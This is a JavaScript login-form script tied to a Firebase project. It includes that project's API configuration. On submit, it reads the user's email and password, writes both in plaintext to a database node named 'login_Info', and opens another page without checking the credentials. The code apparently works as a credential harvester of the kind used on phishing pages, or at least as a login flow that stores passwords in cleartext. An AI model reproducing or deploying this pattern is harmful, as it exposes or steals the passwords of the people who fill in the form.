const firebaseConfig = {
    apiKey: "AIzaSyB3a1QaKe3My1l0XO0t8QqsaUFvgTap4B4",
    authDomain: "lohelpregdetail.firebaseapp.com",
    databaseURL: "https://lohelpregdetail-default-rtdb.firebaseio.com",
    projectId: "lohelpregdetail",
    storageBucket: "lohelpregdetail.appspot.com",
    messagingSenderId: "983881342732",
    appId: "1:983881342732:web:81b33a959232e46032b329",
    measurementId: "G-B2GTKEXTJV"
  };
  
  //initialize firebase
  firebase.initializeApp(firebaseConfig);
  //reference your database
  var LoginformDB=firebase.database().ref('login_Info');

  document.getElementById('login_id').addEventListener('submit',submitForm);

  function submitForm(e)
{
  e.preventDefault();

  var email=getElementVal('emailId');
  var password=getElementVal('passWord');

 saveInfo(email,password);
  
 window.open('Index.html');

  
 document.getElementById("passWord").value = "";
 document.getElementById('emailId').value="";
}

const saveInfo=(email,password) =>{
    var newLoginForm=LoginformDB.push();
    newLoginForm.set({
      email:email,
      password:password,
    });
  }
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  }
  